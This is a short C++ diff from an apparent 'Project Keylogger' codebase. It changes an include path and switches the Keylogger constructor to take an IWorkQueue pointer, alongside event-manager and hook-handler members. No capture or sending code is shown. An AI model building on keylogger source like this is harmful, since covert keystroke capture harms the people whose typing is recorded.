@@ -2,12 +2,12 @@
 * Project Keylogger
 */
 
-#include "keylogger_dll/Keylogger.h"
+#include "Keylogger.h"
 
 /**
 * Keylogger implementation
 */
-Keylogger::Keylogger(WorkQueue& wqueue) : _eventManager(*(new EventManager(*this))), _hookHandler(*(new HookHandler(_eventManager))), IKeylogger(), _levents(wqueue) {
+Keylogger::Keylogger(IWorkQueue *wqueue) : _eventManager(*(new EventManager(*this))), _hookHandler(*(new HookHandler(_eventManager))), IKeylogger(), _levents(wqueue) {
 	_running = false;
 }
 
